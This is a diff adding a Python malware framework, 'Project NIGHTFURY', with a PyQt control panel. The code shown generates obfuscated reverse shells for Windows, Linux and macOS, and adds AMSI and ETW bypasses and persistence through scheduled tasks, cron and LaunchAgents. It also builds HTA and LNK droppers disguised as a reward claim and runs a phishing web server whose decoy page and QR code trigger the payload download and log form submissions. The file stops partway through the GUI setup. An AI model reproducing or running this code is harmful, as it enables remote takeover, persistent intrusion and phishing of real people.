@@ -1,0 +1,2274 @@
+#!/usr/bin/env python3
+"""
+Project NIGHTFURY - Advanced Auto-Execute Payload System
+Author: Cyber Sentinel
+Version: 5.0 - OWASP Enhanced Edition
+Description: Advanced payload framework with multi-platform support and enhanced evasion
+"""
+
+import os
+import sys
+import base64
+import random
+import string
+import socket
+import threading
+import time
+import requests
+import json
+import discord
+from discord.ext import commands
+import asyncio
+import subprocess
+import uuid
+import re
+import logging
+import qrcode
+import io
+import platform
+import sqlite3
+import datetime
+import tempfile
+import zipfile
+import shutil
+from cryptography.fernet import Fernet
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
+from PyQt5.QtWidgets import (
+    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
+    QLabel, QLineEdit, QPushButton, QTextEdit, QCheckBox, QGroupBox,
+    QComboBox, QListWidget, QListWidgetItem, QProgressBar, QMessageBox,
+    QFileDialog, QSplitter, QFormLayout, QSizePolicy, QStatusBar, QStackedWidget,
+    QTreeWidget, QTreeWidgetItem, QTableWidget, QTableWidgetItem, QHeaderView,
+    QDockWidget, QMenu, QAction, QSystemTrayIcon, QToolBar, QToolButton, QDialog,
+    QInputDialog, QListView, QStyledItemDelegate, QStyle, QSpinBox, QDoubleSpinBox,
+    QSlider, QProgressDialog, QDialogButtonBox, QFrame, QGridLayout
+)
+from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSize, QPoint, QRect, QUrl
+from PyQt5.QtGui import (QFont, QPalette, QColor, QIcon, QPixmap, QImage, QDesktopServices, 
+                         QPainter, QLinearGradient, QBrush, QPen, QPainterPath, QMouseEvent)
+from PyQt5.QtChart import QChart, QChartView, QPieSeries, QBarSet, QBarSeries, QValueAxis, QBarCategoryAxis
+
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler("nightfury.log"),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger("NIGHTFURY")
+
+# ==============================
+# PLUGIN SYSTEM
+# ==============================
+
+class Plugin:
+    """Base class for all plugins"""
+    def __init__(self, core):
+        self.core = core
+        self.name = "Unnamed Plugin"
+        self.version = "1.0"
+        self.description = "No description"
+        
+    def initialize(self):
+        """Initialize the plugin"""
+        pass
+        
+    def execute(self, *args, **kwargs):
+        """Execute plugin functionality"""
+        pass
+
+class PluginManager:
+    """Manages plugin loading and execution"""
+    def __init__(self):
+        self.plugins = {}
+        self.loaded_plugins = {}
+        
+    def register_plugin(self, name, plugin_class):
+        """Register a plugin class"""
+        self.plugins[name] = plugin_class
+        
+    def load_plugin(self, name, core):
+        """Load a plugin instance"""
+        if name in self.plugins:
+            plugin = self.plugins[name](core)
+            plugin.initialize()
+            self.loaded_plugins[name] = plugin
+            return plugin
+        return None
+        
+    def get_plugin(self, name):
+        """Get a loaded plugin"""
+        return self.loaded_plugins.get(name)
+        
+    def list_plugins(self):
+        """List all available plugins"""
+        return list(self.plugins.keys())
+
+# ==============================
+# CORE PAYLOAD GENERATION ENGINE
+# ==============================
+
+class NightfuryPayload:
+    def __init__(self, lhost, lport, obfuscation_level=5, persistence=True, 
+                 evasion_techniques=True, platform="windows", payload_type="reverse_shell"):
+        self.lhost = lhost
+        self.lport = lport
+        self.obfuscation_level = obfuscation_level
+        self.persistence = persistence
+        self.evasion_techniques = evasion_techniques
+        self.platform = platform
+        self.payload_type = payload_type
+        self.payload = None
+        self.payload_id = str(uuid.uuid4())[:8]
+        self.encryption_key = Fernet.generate_key()
+        self.fernet = Fernet(self.encryption_key)
+    
+    def _generate_key(self, length=32):
+        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
+    
+    def _xor_encrypt(self, payload):
+        key = self._generate_key()
+        encrypted = bytearray()
+        for i in range(len(payload)):
+            encrypted.append(payload[i] ^ ord(key[i % len(key)]))
+        return base64.b64encode(encrypted).decode(), key
+    
+    def _aes_encrypt(self, payload):
+        encrypted = self.fernet.encrypt(payload)
+        return base64.b64encode(encrypted).decode()
+    
+    def _add_amsi_bypass(self, payload):
+        bypass_code = '''
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
+        [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').SetValue($null, @{});
+        '''
+        return bypass_code + payload
+    
+    def _add_etw_bypass(self, payload):
+        etw_bypass = '''
+        $etwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');
+        $etwProvider.GetField('etwProvider','NonPublic,Static').SetValue($null, $null);
+        '''
+        return etw_bypass + payload
+    
+    def _add_sleep_obfuscation(self, payload):
+        sleep_obfuscation = '''
+        function Invoke-SleepObfuscation {
+            param($Seconds)
+            $start = Get-Date
+            while ((Get-Date) - $start).TotalSeconds -lt $Seconds) {
+                $dummy = 1..1000 | ForEach-Object { [math]::Sin($_) }
+            }
+        }
+        '''
+        return sleep_obfuscation + payload.replace('Start-Sleep', 'Invoke-SleepObfuscation')
+    
+    def _add_api_unhooking(self, payload):
+        api_unhooking = '''
+        function Invoke-APIUnhooking {
+            $kernel32 = Add-Type -Name 'Kernel32' -Namespace 'Win32' -MemberDefinition '
+                [DllImport("kernel32.dll")]
+                public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+                
+                [DllImport("kernel32.dll")]
+                public static extern IntPtr LoadLibrary(string lpFileName);
+                
+                [DllImport("kernel32.dll")]
+                public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+            ' -PassThru
+            
+            # TODO: Implement actual API unhooking logic
+            Write-Host "API Unhooking placeholder"
+        }
+        Invoke-APIUnhooking
+        '''
+        return api_unhooking + payload
+    
+    def _add_persistence(self, payload):
+        if self.platform == "windows":
+            persistence_code = f'''
+            $taskName = "SystemHealthCheck_{self.payload_id}";
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"{payload}`"";
+            $trigger = New-ScheduledTaskTrigger -AtLogOn;
+            $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\\$env:USERNAME" -LogonType Interactive;
+            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew;
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null;
+            '''
+        elif self.platform == "linux":
+            persistence_code = f'''
+            echo '{payload}' > /etc/cron.hourly/system-health-check
+            chmod +x /etc/cron.hourly/system-health-check
+            '''
+        else:  # macOS
+            persistence_code = f'''
+            echo '{payload}' > ~/Library/LaunchAgents/com.system.healthcheck.plist
+            launchctl load ~/Library/LaunchAgents/com.system.healthcheck.plist
+            '''
+        
+        return persistence_code
+    
+    def _obfuscate_vars(self, payload):
+        # Replace common variable names with random strings
+        var_map = {
+            'c': self._generate_key(6),
+            's': self._generate_key(6),
+            'b': self._generate_key(6),
+            'i': self._generate_key(6),
+            'd': self._generate_key(6),
+            'sb': self._generate_key(6),
+            'sb2': self._generate_key(6),
+            'bt': self._generate_key(6)
+        }
+        
+        for orig, new in var_map.items():
+            payload = payload.replace(f'${orig}', f'${new}')
+        
+        return payload
+    
+    def _insert_junk_code(self, payload):
+        # Insert random comments and junk operations
+        junk_ops = [
+            "Start-Sleep -Milliseconds 10;",
+            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;",
+            "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');",
+            "$junkVar = [System.Guid]::NewGuid().ToString();",
+            "if ($true) { $null = 1 + 1 };",
+            "for ($i=0; $i -lt 1; $i++) { $null = $i };",
+            "try { $null = Get-Date } catch {};"
+        ]
+        
+        lines = payload.split(';')
+        new_lines = []
+        for line in lines:
+            if line.strip() and random.random() > 0.7:
+                junk = random.choice(junk_ops)
+                new_lines.append(junk)
+            new_lines.append(line)
+        
+        return ';'.join(new_lines)
+    
+    def _generate_windows_payload(self):
+        # Base PowerShell reverse shell with enhanced obfuscation
+        ps_code = f'''
+        $c = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});
+        $s = $c.GetStream();
+        [byte[]]$b = 0..65535|%{{0}};
+        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
+            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
+            $sb = (iex $d 2>&1 | Out-String );
+            $sb2 = $sb + "PS " + (pwd).Path + "> ";
+            $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
+            $s.Write($sbt,0,$sbt.Length);
+            $s.Flush()
+        }}
+        $c.Close()
+        '''
+        
+        # Add evasion techniques
+        if self.evasion_techniques:
+            ps_code = self._add_amsi_bypass(ps_code)
+            ps_code = self._add_etw_bypass(ps_code)
+            ps_code = self._add_sleep_obfuscation(ps_code)
+            ps_code = self._add_api_unhooking(ps_code)
+        
+        # Apply obfuscation layers
+        for _ in range(self.obfuscation_level):
+            encrypted, key = self._xor_encrypt(ps_code.encode())
+            ps_code = f'''
+            $k = "{key}";
+            $s = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{encrypted}"));
+            $r = '';
+            0..($s.Length-1)|%{{$r += [char]($s[$_] -bxor $k[$_ % $k.Length])}};
+            iex $r
+            '''
+            # Randomize variable names
+            ps_code = self._obfuscate_vars(ps_code)
+            # Insert junk code
+            ps_code = self._insert_junk_code(ps_code)
+        
+        # Add persistence if requested
+        if self.persistence:
+            ps_code = self._add_persistence(ps_code)
+        
+        return ps_code
+    
+    def _generate_linux_payload(self):
+        # Linux bash reverse shell
+        bash_code = f'''#!/bin/bash
+        while true; do
+            bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1 2>/dev/null
+            sleep 30
+        done
+        '''
+        
+        # Add persistence if requested
+        if self.persistence:
+            bash_code += f'''
+            # Add to crontab for persistence
+            (crontab -l 2>/dev/null; echo "@reboot sleep 60 && {bash_code}") | crontab -
+            '''
+        
+        return bash_code
+    
+    def _generate_macos_payload(self):
+        # macOS reverse shell (bash or python)
+        macos_code = f'''#!/bin/bash
+        # Check if we have python
+        if command -v python3 &> /dev/null; then
+            python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.lhost}',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
+        else
+            bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
+        fi
+        '''
+        
+        # Add persistence if requested
+        if self.persistence:
+            macos_code += f'''
+            # Create launch agent for persistence
+            cat > ~/Library/LaunchAgents/com.system.update.plist << EOF
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+            <plist version="1.0">
+            <dict>
+                <key>Label</key>
+                <string>com.system.update</string>
+                <key>ProgramArguments</key>
+                <array>
+                    <string>/bin/bash</string>
+                    <string>-c</string>
+                    <string>{macos_code}</string>
+                </array>
+                <key>RunAtLoad</key>
+                <true/>
+                <key>KeepAlive</key>
+                <true/>
+            </dict>
+            </plist>
+            EOF
+            launchctl load ~/Library/LaunchAgents/com.system.update.plist
+            '''
+        
+        return macos_code
+    
+    def generate(self):
+        # Generate platform-specific payload
+        if self.platform == "windows":
+            ps_code = self._generate_windows_payload()
+            self.payload = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"{ps_code}\""
+        elif self.platform == "linux":
+            self.payload = self._generate_linux_payload()
+        elif self.platform == "macos":
+            self.payload = self._generate_macos_payload()
+        else:
+            raise ValueError(f"Unsupported platform: {self.platform}")
+        
+        return self.payload
+    
+    def generate_hta(self):
+        if not self.payload:
+            self.generate()
+        
+        # Create HTA file that auto-executes the payload
+        hta_content = f"""
+        <html>
+        <head>
+        <title>Reward Claim Center</title>
+        <HTA:APPLICATION ID="RewardClaim" APPLICATIONNAME="Reward Claim" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
+        <script language="VBScript">
+            Sub Window_OnLoad
+                On Error Resume Next
+                Set objShell = CreateObject("Wscript.Shell")
+                objShell.Run "{self.payload.replace('"', '""')}", 0, False
+                Self.Close
+            End Sub
+        </script>
+        </head>
+        <body>
+        <div style="font-family: Arial; text-align: center; padding: 50px;">
+            <h1>Processing Your Reward...</h1>
+            <p>Please wait while we verify and apply your bonus.</p>
+        </div>
+        </body>
+        </html>
+        """
+        return hta_content
+    
+    def generate_lnk(self, output_path):
+        """Generate a LNK file that executes the payload"""
+        if not self.payload:
+            self.generate()
+        
+        # Create a VBS script that will be called by the LNK file
+        vbs_content = f'''
+        Set WshShell = CreateObject("WScript.Shell")
+        WshShell.Run "{self.payload}", 0, False
+        Set WshShell = Nothing
+        '''
+        
+        vbs_path = os.path.join(tempfile.gettempdir(), f"system_update_{random.randint(1000, 9999)}.vbs")
+        with open(vbs_path, 'w') as f:
+            f.write(vbs_content)
+        
+        # Create LNK file
+        lnk_content = f'''
+        [InternetShortcut]
+        URL=file:///{vbs_path.replace(os.sep, '/')}
+        IconIndex=0
+        HotKey=0
+        IconFile=C:\\Windows\\System32\\shell32.dll
+        '''
+        
+        with open(output_path, 'w') as f:
+            f.write(lnk_content)
+        
+        return output_path
+
+# ========================
+# AUTO-EXECUTION ENGINES
+# ========================
+
+class AutoExecutionServer(BaseHTTPRequestHandler):
+    def do_GET(self):
+        parsed_path = urlparse(self.path)
+        query = parse_qs(parsed_path.query)
+        
+        # Check for trigger parameter
+        if parsed_path.path == "/claim":
+            # Send auto-execute HTA file
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/hta')
+            self.send_header('Content-Disposition', 'attachment; filename="reward_claim.hta"')
+            self.end_headers()
+            
+            # Generate HTA payload
+            payload = NightfuryPayload(
+                self.server.lhost, 
+                self.server.lport,
+                self.server.obfuscation_level,
+                self.server.persistence,
+                self.server.evasion_techniques,
+                self.server.platform
+            )
+            hta_content = payload.generate_hta()
+            self.wfile.write(hta_content.encode())
+            logger.info(f"Served payload to {self.client_address[0]}")
+            return
+        
+        # Serve a decoy page
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        
+        # Generate a random claim token
+        claim_token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+        claim_url = f"http://{self.server.domain}/claim?token={claim_token}"
+        
+        # Create QR code
+        qr = qrcode.QRCode()
+        qr.add_data(claim_url)
+        qr_img = qr.make_image(fill_color="black", back_color="white")
+        img_byte_arr = io.BytesIO()
+        qr_img.save(img_byte_arr, format='PNG')
+        img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode()
+        
+        # Serve decoy page with QR code
+        html_content = f"""
+        <html>
+        <head>
+            <title>Exclusive Reward Claim</title>
+            <style>
+                body {{ font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c); 
+                        color: white; text-align: center; padding: 20px; }}
+                .container {{ max-width: 800px; margin: 0 auto; background: rgba(0, 0, 0, 0.7); 
+                            padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }}
+                h1 {{ color: #ffcc00; }}
+                .qr-container {{ margin: 20px auto; padding: 15px; background: white; 
+                                border-radius: 10px; display: inline-block; }}
+                .button {{ background: #ffcc00; color: #1a2a6c; padding: 15px 30px; 
+                         font-size: 18px; border: none; border-radius: 50px; 
+                         cursor: pointer; font-weight: bold; margin: 20px; 
+                         box-shadow: 0 4px 8px rgba(0,0,0,0.3); }}
+                .button:hover {{ background: #ffdd33; }}
+                .instructions {{ background: rgba(255, 255, 255, 0.1); padding: 15px; 
+                              border-radius: 10px; margin: 20px 0; text-align: left; }}
+            </style>
+            <script>
+                function startClaim() {{
+                    // Create iframe to trigger download without leaving page
+                    var iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = '/claim?token={claim_token}';
+                    document.body.appendChild(iframe);
+                    
+                    // Show processing message
+                    document.getElementById('processing').style.display = 'block';
+                    document.getElementById('claim-button').style.display = 'none';
+                    
+                    // Show manual download link after delay
+                    setTimeout(function() {{
+                        document.getElementById('manual-download').style.display = 'block';
+                    }}, 5000);
+                }}
+                
+                function downloadLNK() {{
+                    window.location.href = '/download_lnk?token={claim_token}';
+                }}
+            </script>
+        </head>
+        <body>
+            <div class="container">
+                <h1>🎁 Exclusive Reward Claim Center 🎁</h1>
+                <p>Congratulations! You've been selected to receive a special bonus.</p>
+                
+                <div class="qr-container">
+                    <img src="data:image/png;base64,{img_base64}" alt="Claim QR Code" width="200">
+                </div>
+                
+                <p>Scan the QR code with your mobile device or click the button below to claim your reward:</p>
+                
+                <button id="claim-button" class="button" onclick="startClaim()">CLAIM YOUR REWARD NOW</button>
+                
+                <button id="lnk-button" class="button" onclick="downloadLNK()" style="background: #4CAF50;">
+                    DOWNLOAD AS SHORTCUT
+                </button>
+                
+                <div id="processing" style="display: none;">
+                    <h2>Processing Your Claim...</h2>
+                    <p>Your reward is being prepared. This may take a few moments.</p>
+                    <div style="margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; 
+                                border-top: 5px solid #ffcc00; border-radius: 50%; animation: spin 2s linear infinite;"></div>
+                    <style>@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}</style>
+                </div>
+                
+                <div id="manual-download" style="display: none; margin-top: 30px;">
+                    <div class="instructions">
+                        <h3>Manual Claim Instructions</h3>
+                        <p>If your reward didn't start automatically:</p>
+                        <ol>
+                            <li>Click the download link below</li>
+                            <li>Open the downloaded file</li>
+                            <li>Click "Run" if prompted by Windows security</li>
+                        </ol>
+                        <p><a href="/claim?token={claim_token}" style="color: #ffcc00; font-weight: bold;">Download Reward Claim Assistant</a></p>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 30px; font-size: 14px; opacity: 0.8;">
+                    <p>This is a secure system provided by your organization.</p>
+                </div>
+            </div>
+        </body>
+        </html>
+        """
+        
+        self.wfile.write(html_content.encode())
+        logger.info(f"Served decoy page to {self.client_address[0]}")
+    
+    def do_POST(self):
+        parsed_path = urlparse(self.path)
+        
+        if parsed_path.path == "/submit_form":
+            # Process form submission (phishing)
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length).decode()
+            form_data = parse_qs(post_data)
+            
+            # Log form submission
+            logger.info(f"Form submission from {self.client_address[0]}: {form_data}")
+            
+            # Redirect to claim page
+            self.send_response(302)
+            self.send_header('Location', '/claim')
+            self.end_headers()
+            return
+
+# =====================
+# ENHANCED GUI APPLICATION
+# =====================
+
+class ModernButton(QPushButton):
+    """Modern styled button with hover effects"""
+    def __init__(self, text, parent=None):
+        super().__init__(text, parent)
+        self.setCursor(Qt.PointingHandCursor)
+        self.setMinimumHeight(35)
+        
+    def enterEvent(self, event):
+        self.setStyleSheet("""
+            QPushButton {
+                background-color: #5a9cff;
+                color: white;
+                border: none;
+                border-radius: 5px;
+                padding: 8px 16px;
+                font-weight: bold;
+            }
+        """)
+        super().enterEvent(event)
+        
+    def leaveEvent(self, event):
+        self.setStyleSheet("""
+            QPushButton {
+                background-color: #3d8eff;
+                color: white;
+                border: none;
+                border-radius: 5px;
+                padding: 8px 16px;
+                font-weight: bold;
+            }
+        """)
+        super().leaveEvent(event)
+
+class AnimatedProgressBar(QProgressBar):
+    """Progress bar with animation"""
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.animation = QPropertyAnimation(self, b"value")
+        self.animation.setDuration(1000)
+        
+    def setValueAnimated(self, value):
+        self.animation.setStartValue(self.value())
+        self.animation.setEndValue(value)
+        self.animation.start()
+
+class ConnectionGraph(QWidget):
+    """Real-time connection graph widget"""
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.data = []
+        self.max_points = 50
+        self.setMinimumHeight(150)
+        
+    def add_data_point(self, value):
+        self.data.append(value)
+        if len(self.data) > self.max_points:
+            self.data.pop(0)
+        self.update()
+        
+    def paintEvent(self, event):
+        painter = QPainter(self)
+        painter.setRenderHint(QPainter.Antialiasing)
+        
+        # Draw background
+        painter.fillRect(self.rect(), QColor(40, 44, 52))
+        
+        if not self.data:
+            return
+            
+        # Draw grid
+        painter.setPen(QPen(QColor(70, 74, 82), 1, Qt.DotLine))
+        for i in range(5):
+            y = self.height() - (i * self.height() / 4)
+            painter.drawLine(0, y, self.width(), y)
+            
+        # Draw data line
+        max_value = max(self.data) if max(self.data) > 0 else 1
+        path = QPainterPath()
+        
+        for i, value in enumerate(self.data):
+            x = i * self.width() / (len(self.data) - 1) if len(self.data) > 1 else 0
+            y = self.height() - (value / max_value * self.height())
+            
+            if i == 0:
+                path.moveTo(x, y)
+            else:
+                path.lineTo(x, y)
+                
+        # Draw gradient under the line
+        gradient_path = QPainterPath(path)
+        gradient_path.lineTo(self.width(), self.height())
+        gradient_path.lineTo(0, self.height())
+        gradient_path.closeSubpath()
+        
+        gradient = QLinearGradient(0, 0, 0, self.height())
+        gradient.setColorAt(0, QColor(61, 142, 255, 100))
+        gradient.setColorAt(1, QColor(61, 142, 255, 20))
+        
+        painter.fillPath(gradient_path, gradient)
+        
+        # Draw the line
+        painter.setPen(QPen(QColor(61, 142, 255), 2))
+        painter.drawPath(path)
+        
+        # Draw points
+        painter.setPen(Qt.NoPen)
+        painter.setBrush(QColor(61, 142, 255))
+        
+        for i, value in enumerate(self.data):
+            x = i * self.width() / (len(self.data) - 1) if len(self.data) > 1 else 0
+            y = self.height() - (value / max_value * self.height())
+            painter.drawEllipse(QPoint(x, y), 3, 3)
+
+class NightfuryGUI(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("Project NIGHTFURY v5.0 - OWASP Enhanced")
+        self.setGeometry(100, 100, 1400, 900)
+        
+        # Initialize configuration
+        self.config = {
+            'lhost': self.get_public_ip(),
+            'lport': 4444,
+            'obfuscation_level': 5,
+            'persistence': True,
+            'evasion_techniques': True,
+            'platform': "windows",
+            'payload_type': "reverse_shell",
+            'discord_token': "",
+            'auto_server_port': 8080,
+            'domain': "reward-center.org",
+            'auto_start_server': False,
+            'auto_start_bot': False
+        }
+        self.current_payload = None
+        self.listener_thread = None
+        self.http_server = None
+        self.discord_bot = None
+        self.active_connections = []
+        self.connection_stats = []
+        self.plugin_manager = PluginManager()
+        
+        # Create main tabs
+        self.tabs = QTabWidget()
+        self.tabs.setTabPosition(QTabWidget.West)
+        self.tabs.setDocumentMode(True)
+        self.setCentralWidget(self.tabs)
+        
+        # Create tabs
+        self.create_dashboard_tab()
+        self.create_config_tab()
+        self.create_payload_tab()
+        self.create_listener_tab()
+        self.create_auto_execute_tab()
+        self.create_plugins_tab()
+        
+        # Create status bar
+        self.status_bar = QStatusBar()
+        self.setStatusBar(self.status_bar)
+        self.status_bar.showMessage("✅ System Ready")
+        
+        # Create toolbar
+        self.create_toolbar()
+        
+        # Apply dark theme
+        self.apply_dark_theme()
+        
+        # Show banner
+        self.show_banner()
+        
+        # Setup connection monitor
+        self.connection_monitor = QTimer()
+        self.connection_monitor.timeout.connect(self.update_connection_status)
+        self.connection_monitor.start(1000)  # Check every second
+        
+        # Setup stats monitor
+        self.stats_monitor = QTimer()
+        self.stats_monitor.timeout.connect(self.update_stats)
+        self.stats_monitor.start(5000)  # Update stats every 5 seconds
+        
+        # Load plugins
+        self.load_plugins()
+        
+        # Setup system tray
+        self.setup_system_tray()
+    
+    def create_toolbar(self):
+        toolbar = QToolBar("Main Toolbar")
+        toolbar.setIconSize(QSize(24, 24))
+        self.addToolBar(toolbar)
+        
+        # Add actions
+        start_action = QAction(QIcon.fromTheme("media-playback-start"), "Start Listener", self)
+        start_action.triggered.connect(self.start_listener)
+        toolbar.addAction(start_action)
+        
+        stop_action = QAction(QIcon.fromTheme("media-playback-stop"), "Stop Listener", self)
+        stop_action.triggered.connect(self.stop_listener)
+        toolbar.addAction(stop_action)
+        
+        toolbar.addSeparator()
+        
+        generate_action = QAction(QIcon.fromTheme("document-new"), "Generate Payload", self)
+        generate_action.triggered.connect(self.generate_payload)
+        toolbar.addAction(generate_action)
+        
+        save_action = QAction(QIcon.fromTheme("document-save"), "Save Payload", self)
+        save_action.triggered.connect(self.save_payload)
+        toolbar.addAction(save_action)
+        
+        toolbar.addSeparator()
+        
+        settings_action = QAction(QIcon.fromTheme("preferences-system"), "Settings", self)
+        settings_action.triggered.connect(self.show_settings)
+        toolbar.addAction(settings_action)
+    
+    def create_dashboard_tab(self):
+        dashboard_tab = QWidget()
+        layout = QVBoxLayout()
+        dashboard_tab.setLayout(layout)
+        self.tabs.addTab(dashboard_tab, "🏠 Dashboard")
+        
+        # Stats overview
+        stats_group = QGroupBox("Overview")
+        stats_layout = QHBoxLayout()
+        
+        # Connection stats
+        conn_widget = QWidget()
+        conn_layout = QVBoxLayout()
+        self.conn_count = QLabel("0")
+        self.conn_count.setAlignment(Qt.AlignCenter)
+        self.conn_count.setStyleSheet("font-size: 24px; font-weight: bold; color: #61aeee;")
+        conn_layout.addWidget(self.conn_count)
+        conn_layout.addWidget(QLabel("Active Connections"))
+        conn_widget.setLayout(conn_layout)
+        stats_layout.addWidget(conn_widget)
+        
+        # Server stats
+        server_widget = QWidget()
+        server_layout = QVBoxLayout()
+        self.server_status = QLabel("Stopped")
+        self.server_status.setAlignment(Qt.AlignCenter)
+        self.server_status.setStyleSheet("font-size: 24px; font-weight: bold; color: #e06c75;")
+        server_layout.addWidget(self.server_status)
+        server_layout.addWidget(QLabel("Auto-Server Status"))
+        server_widget.setLayout(server_layout)
+        stats_layout.addWidget(server_widget)
+        
+        # Bot stats
+        bot_widget = QWidget()
+        bot_layout = QVBoxLayout()
+        self.bot_status_dash = QLabel("Stopped")
+        self.bot_status_dash.setAlignment(Qt.AlignCenter)
+        self.bot_status_dash.setStyleSheet("font-size: 24px; font-weight: bold; color: #e06c75;")
+        bot_layout.addWidget(self.bot_status_dash)
+        bot_layout.addWidget(QLabel("Discord Bot Status"))
+        bot_widget.setLayout(bot_layout)
+        stats_layout.addWidget(bot_widget)
+        
+        # Payload stats
+        payload_widget = QWidget()
+        payload_layout = QVBoxLayout()
+        self.payload_count = QLabel("0")
+        self.payload_count.setAlignment(Qt.AlignCenter)
+        self.payload_count.setStyleSheet("font-size: 24px; font-weight: bold; color: #98c379;")
+        payload_layout.addWidget(self.payload_count)
+        payload_layout.addWidget(QLabel("Payloads Generated"))
+        payload_widget.setLayout(payload_layout)
+        stats_layout.addWidget(payload_widget)
+        
+        stats_group.setLayout(stats_layout)
+        layout.addWidget(stats_group)
+        
+        # Connection graph
+        graph_group = QGroupBox("Connection Activity")
+        graph_layout = QVBoxLayout()
+        self.connection_graph = ConnectionGraph()
+        graph_layout.addWidget(self.connection_graph)
+        graph_group.setLayout(graph_layout)
+        layout.addWidget(graph_group)
+        
+        # Recent activity
+        activity_group = QGroupBox("Recent Activity")
+        activity_layout = QVBoxLayout()
+        self.activity_list = QListWidget()
+        activity_layout.addWidget(self.activity_list)
+        activity_group.setLayout(activity_layout)
+        layout.addWidget(activity_group)
+    
+    def create_config_tab(self):
+        config_tab = QWidget()
+        layout = QVBoxLayout()
+        config_tab.setLayout(layout)
+        self.tabs.addTab(config_tab, "⚙️ Configuration")
+        
+        # Network settings group
+        network_group = QGroupBox("Network Settings")
+        network_layout = QFormLayout()
+        
+        self.lhost_input = QLineEdit(self.config['lhost'])
+        self.lhost_input.setPlaceholderText("Listener IP")
+        network_layout.addRow("LHOST (Listener IP):", self.lhost_input)
+        
+        self.lport_input = QLineEdit(str(self.config['lport']))
+        self.lport_input.setPlaceholderText("Listener Port")
+        network_layout.addRow("LPORT (Listener Port):", self.lport_input)
+        
+        self.server_port_input = QLineEdit(str(self.config['auto_server_port']))
+        self.server_port_input.setPlaceholderText("Auto-Execute Server Port")
+        network_layout.addRow("Server Port:", self.server_port_input)
+        
+        self.domain_input = QLineEdit(self.config['domain'])
+        self.domain_input.setPlaceholderText("Obfuscation Domain")
+        network_layout.addRow("Obfuscation Domain:", self.domain_input)
+        
+        network_group.setLayout(network_layout)
+        layout.addWidget(network_group)
+        
+        # Payload settings group
+        payload_group = QGroupBox("Payload Settings")
+        payload_layout = QFormLayout()
+        
+        self.platform_combo = QComboBox()
+        self.platform_combo.addItems(["Windows", "Linux", "macOS"])
+        self.platform_combo.setCurrentText(self.config['platform'].capitalize())
+        payload_layout.addRow("Target Platform:", self.platform_combo)
+        
+        self.payload_type_combo = QComboBox()
+        self.payload_type_combo.addItems(["Reverse Shell", "Meterpreter", "Bind Shell", "Web Shell"])
+        payload_layout.addRow("Payload Type:", self.payload_type_combo)
+        
+        self.obf_level = QComboBox()
+        self.obf_level.addItems(["1 (Low)", "2", "3", "4 (Recommended)", "5 (Maximum)"])
+        self.obf_level.setCurrentIndex(3)
+        payload_layout.addRow("Obfuscation Level:", self.obf_level)
+        
+        self.persistence_cb = QCheckBox("Enable persistence (survives reboot)")
+        self.persistence_cb.setChecked(True)
+        payload_layout.addRow(self.persistence_cb)
+        
+        self.evasion_cb = QCheckBox("Enable advanced evasion techniques")
+        self.evasion_cb.setChecked(True)
+        payload_layout.addRow(self.evasion_cb)
+        
+        payload_group.setLayout(payload_layout)
+        layout.addWidget(payload_group)
+        
+        # API settings group
+        api_group = QGroupBox("Discord Integration")
+        api_layout = QFormLayout()
+        
